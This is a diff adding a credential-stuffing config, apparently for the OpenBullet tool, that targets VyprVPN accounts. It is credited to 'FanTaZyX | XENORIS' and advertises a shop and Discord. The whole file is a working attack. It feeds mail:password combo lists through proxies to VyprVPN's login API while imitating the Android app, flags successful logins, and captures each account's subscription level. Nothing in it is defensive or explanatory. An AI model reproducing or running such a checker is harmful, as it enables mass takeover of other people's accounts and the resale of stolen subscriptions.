@@ -1,0 +1,62 @@
+[SETTINGS]
+{
+  "Name": "VYPRVPN",
+  "SuggestedBots": 80,
+  "LastModified": "2019-08-19T18:49:28.0788296+05:30",
+  "AdditionalInfo": "SHOP : https://shoppy.gg/@FanTaZyX | DISCORD : FanTaZyX#2670",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "FanTaZyX | XENORIS (loliX Encrypted)",
+  "Version": "1.2.1.3",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#XENORIS REQUEST GET "https://api.goldenfrog.com/settings" 
+  
+  HEADER "User-Agent: okhttp/3.12.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "X-API-Version: 2" 
+  HEADER "X-API-Features: partial_sign_up;" 
+  HEADER "X-GF-PRODUCT: VyprVPN" 
+  HEADER "X-GF-PRODUCT-VERSION: 3.0.1.10909" 
+  HEADER "X-GF-PLATFORM: Android" 
+  HEADER "X-GF-PLATFORM-VERSION: 5.1.1" 
+  HEADER "locale: fr_FR" 
+  HEADER "Connection: close" 
+  HEADER "username: <USER>" 
+  HEADER "X-GF-Agent: VyprVPN Android v3.0.1.10909. (b07f9329)" 
+  HEADER "password: <PASS>" 
+  HEADER "Host: api.goldenfrog.com" 
+  HEADER "Accept-Encoding: gzip" 
+
+#XENORIS KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "invalid username or password" 
+  KEYCHAIN Success OR 
+    KEY "control_panel" 
+
+#XENORIS PARSE "<SOURCE>" JSON "account_level_display" -> CAP "SUBSCRIPTION" 
+
+#XENORIS KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<SOURCE>" DoesNotContain "account_level_display" 
+
+
